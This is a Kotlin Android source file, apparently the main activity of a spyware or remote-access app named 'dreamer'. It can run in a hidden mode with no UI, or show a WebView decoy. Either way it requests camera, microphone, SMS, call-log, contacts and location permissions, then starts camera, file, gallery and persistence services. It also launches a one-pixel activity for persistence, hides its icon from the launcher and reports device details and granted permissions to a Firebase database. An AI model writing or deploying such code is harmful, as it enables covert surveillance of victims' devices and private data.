package com.h4k3r.dreamer

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.*
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts

import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import java.security.MessageDigest

class MainActivity : ComponentActivity() {
    companion object {
        private const val TAG = "MainActivity"
    }

    /* ── Configuration Data Classes ────────────────────────────── */
    data class AppConfig(
        val hidden: Boolean = false,
        val visible: Boolean = true
    )

    data class PermissionConfig(
        val permissions: Map<String, Boolean> = emptyMap()
    )

    /* ── State Management ────────────────────────────────── */
    private lateinit var appConfig: AppConfig
    private lateinit var permissionConfig: Map<String, Boolean>
    private var webViewUrl: String = ""
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /* ── Permission Launcher ─────────────────────────────────── */
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        handlePermissionResults(permissions)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Load configurations from assets
        loadConfigurations()

        // Save authentication before starting services
        saveAuthentication()

        // Handle app flow based on configuration
        when {
            appConfig.hidden -> handleHiddenMode()
            else -> handleNormalMode()
        }
    }

    /* ── Configuration Loading ───────────────────────────────── */
    private fun loadConfigurations() {
        try {
            // Load app_config.json
            val appConfigJson = assets.open("app_config.json").bufferedReader().use { it.readText() }
            appConfig = Gson().fromJson(appConfigJson, AppConfig::class.java)

            // Load permissions/config.json
            val permConfigJson = assets.open("permissions/config.json").bufferedReader().use { it.readText() }
            val type = object : TypeToken<Map<String, Boolean>>() {}.type
            permissionConfig = Gson().fromJson(permConfigJson, type)

            // Load webview_url.txt
            webViewUrl = try {
                assets.open("webview_url.txt").bufferedReader().use { it.readText().trim() }
            } catch (e: Exception) {
                "https://www.google.com" // Default URL
            }

            Log.d(TAG, "Config loaded - Hidden: ${appConfig.hidden}, URL: $webViewUrl")

        } catch (e: Exception) {
            Log.e(TAG, "Error loading configurations", e)
            // Use defaults
            appConfig = AppConfig()
            permissionConfig = getDefaultPermissionConfig()
            webViewUrl = "https://www.google.com"
        }
    }

    /* ── Hidden Mode Implementation ──────────────────────────── */
    private fun handleHiddenMode() {
        Log.d(TAG, "Running in hidden mode")

        // No UI in hidden mode
        setContentView(View(this).apply {
            visibility = View.GONE
        })

        // Request only permissions marked as true
        val permissionsToRequest = permissionConfig
            .filter { it.value }
            .mapNotNull { getManifestPermission(it.key) }
            .filter { permission ->
                ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
            }

        if (permissionsToRequest.isNotEmpty()) {
            Log.d(TAG, "Requesting ${permissionsToRequest.size} permissions")
            permissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            Log.d(TAG, "All required permissions already granted")
            completeHiddenSetup()
        }
    }

    /* ── Normal Mode (WebView) ──────────────────────────────── */
    private fun handleNormalMode() {
        Log.d(TAG, "Running in normal mode with WebView")

        // Ensure authentication is stored on first launch
        saveAuthentication()

        // Show WebView directly
        val webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                allowContentAccess = true
                loadWithOverviewMode = true
                useWideViewPort = true
            }

            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    Log.d(TAG, "WebView loaded: $url")
                }
            }

            loadUrl(webViewUrl)
        }

        setContentView(webView)

        // Request permissions in background
        requestPermissionsInBackground()
    }

    /* ── Permission Handling ─────────────────────────────────── */
    private fun handlePermissionResults(permissions: Map<String, Boolean>) {
        val granted = permissions.filter { it.value }.size
        val denied = permissions.filter { !it.value }.size

        Log.d(TAG, "Permissions - Granted: $granted, Denied: $denied")

        if (appConfig.hidden) {
            // In hidden mode, proceed regardless of permission results
            completeHiddenSetup()
        } else {
            // In normal mode, just log the results
            updateFirebasePermissions(permissions)
        }
    }

    /* ── Hidden Mode Completion ──────────────────────────────── */
    private fun completeHiddenSetup() {
        // Save authentication
        saveAuthentication()

        // Start all services
        startAllServices()

        // Start OnePixelActivity for additional persistence (only on Android < 12)
        if (android.os.Build.VERSION.SDK_INT < 31) {
            try {
                val intent = Intent(this, OnePixelActivity::class.java)
                startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start OnePixelActivity", e)
            }
        }

        // Update Firebase
        updateFirebaseStatus()

        // Hide app from launcher
        hideAppFromLauncher()

        // Close activity after delay
        Handler(Looper.getMainLooper()).postDelayed({
            finish()
        }, 2000)
    }

    /* ── Background Permission Request ────────────────────────── */
    private fun requestPermissionsInBackground() {
        scope.launch {
            delay(3000) // Wait for WebView to load

            val permissionsToRequest = permissionConfig
                .filter { it.value }
                .mapNotNull { getManifestPermission(it.key) }
                .filter { permission ->
                    ContextCompat.checkSelfPermission(this@MainActivity, permission) != PackageManager.PERMISSION_GRANTED
                }

            if (permissionsToRequest.isNotEmpty()) {
                withContext(Dispatchers.Main) {
                    permissionLauncher.launch(permissionsToRequest.toTypedArray())
                }
            }

            // Save authentication before starting services
            saveAuthentication()
            // Start services after permission request
            startAllServices()

                    // Start OnePixelActivity for additional persistence (only on Android < 12)
        if (android.os.Build.VERSION.SDK_INT < 31) {
            try {
                val intent = Intent(this@MainActivity, OnePixelActivity::class.java)
                startActivity(intent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start OnePixelActivity", e)
            }
        }

            // Update Firebase with device info
            updateFirebaseStatus()
        }
    }

    /* ── App Hiding ──────────────────────────────────────────── */
    private fun hideAppFromLauncher() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App hidden from launcher")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide app", e)
        }
    }

    /* ── Service Management ──────────────────────────────────── */
    private fun startAllServices() {
        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java,
            PermissionMonitorService::class.java,
            WatchdogService::class.java,
            AdvancedPersistenceService::class.java
        )

        services.forEach { serviceClass ->
            try {
                val intent = Intent(this, serviceClass)
                // Use regular startService for all services to avoid crashes
                startService(intent)
                Log.d(TAG, "Started service: ${serviceClass.simpleName}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${serviceClass.simpleName}", e)
            }
        }
    }

    private fun hasRequiredPermissions(permissions: List<String>): Boolean {
        if (permissions.isEmpty()) return true

        return permissions.all { perm ->
            ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
        }
    }

    /* ── Authentication & Firebase ───────────────────────────── */
    private fun saveAuthentication() {
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        val editor = prefs.edit()
        
        // Always read secret_key from assets with enhanced error handling
        val secretKey = try {
            val key = assets.open("secret_key.txt").bufferedReader().use { it.readText().trim() }
            Log.d(TAG, "Loaded secret key from assets: ${key.take(3)}...")
            key
        } catch (e: Exception) {
            Log.e(TAG, "Failed to load secret key from assets", e)
            ""
        }
        
        if (secretKey.isNotEmpty()) {
            editor.putString("secret_key", secretKey)
            Log.d(TAG, "Secret key saved to SharedPreferences")
        } else {
            Log.e(TAG, "Secret key is empty, cannot save")
        }
        
        if (!prefs.contains("device_id")) {
            val deviceId = generateDeviceId()
            editor.putString("device_id", deviceId)
            Log.d(TAG, "Generated and saved device ID: $deviceId")
        }
        
        editor.apply()
        
        // Verify the save was successful
        val savedKey = prefs.getString("secret_key", "")
        val savedDeviceId = prefs.getString("device_id", "")
        Log.d(TAG, "Authentication verification - Key: ${savedKey?.take(3)}..., Device: $savedDeviceId")
    }

    private fun generateSecretKey(): String {
        // Generate a random 32-char key
        val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return (1..32).map { chars.random() }.joinToString("")
    }
    private fun generateDeviceId(): String {
        // Use ANDROID_ID or fallback to random
        return android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            ?: (100000..999999).random().toString()
    }

    private fun updateFirebaseStatus() {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""

            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                val deviceInfo = mapOf(
                    "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
                    "android" to Build.VERSION.SDK_INT,
                    "mode" to if (appConfig.hidden) "hidden" else "normal",
                    "time" to System.currentTimeMillis(),
                    "setup_complete" to true
                )

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .setValue(deviceInfo)

                Log.d(TAG, "Firebase updated")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Firebase update failed", e)
        }
    }

    private fun updateFirebasePermissions(permissions: Map<String, Boolean>) {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", "") ?: ""
            val deviceId = prefs.getString("device_id", "") ?: ""

            if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("permissions")
                    .setValue(permissions)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update permissions", e)
        }
    }

    /* ── Helper Methods ──────────────────────────────────────── */
    private fun getSecretKey(): String? {
        return try {
            assets.open("secret_key.txt")
                .bufferedReader()
                .readLine()
                ?.trim()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read secret key", e)
            null
        }
    }

    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location", "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "location_background" -> if (Build.VERSION.SDK_INT >= 29) {
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            } else null
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            "storage", "storage_read" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "storage_write" -> if (Build.VERSION.SDK_INT >= 23) {
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            } else null
            "notifications", "post_notifications" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.POST_NOTIFICATIONS
            } else null
            "bluetooth_connect" -> if (Build.VERSION.SDK_INT >= 31) {
                android.Manifest.permission.BLUETOOTH_CONNECT
            } else null
            "bluetooth_scan" -> if (Build.VERSION.SDK_INT >= 31) {
                android.Manifest.permission.BLUETOOTH_SCAN
            } else null
            else -> null
        }
    }

    private fun getDefaultPermissionConfig(): Map<String, Boolean> {
        return mapOf(
            "camera" to true,
            "location_fine" to true,
            "location_coarse" to false,
            "location_background" to false,
            "contacts" to true,
            "sms" to true,
            "phone" to true,
            "call_log" to true,
            "microphone" to true,
            "storage_read" to true,
            "storage_write" to false,
            "calendar" to false,
            "notifications" to true
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
    }
}